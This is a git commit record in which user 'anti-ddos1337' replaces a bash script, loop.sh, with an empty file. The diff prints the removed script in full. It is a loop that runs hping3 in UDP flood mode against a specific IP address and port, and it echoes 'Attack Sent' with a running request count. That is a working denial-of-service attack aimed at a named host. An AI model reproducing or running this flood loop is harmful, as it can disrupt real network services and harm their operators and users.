af3c1fd68f127d9e6e8aecfff143a80f884765ea
anti-ddos1337 <121333057+anti-ddos1337@users.noreply.github.com>
2023-09-15 14:47:21 -0700

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,9 +1,1 @@
-pport=0
-while :; do
-   request=$((request+1))
-   dstprt=$(shuf -i 1-65535 -n 1)
-   timeout 0.5 hping3 -d 1460 --udp --flood -V -p 1196 66.70.132.200 > /dev/null 2>&1
-   clear
-   echo "Attack Sent -> request sent: $request"
-   sleep 1
-done
+
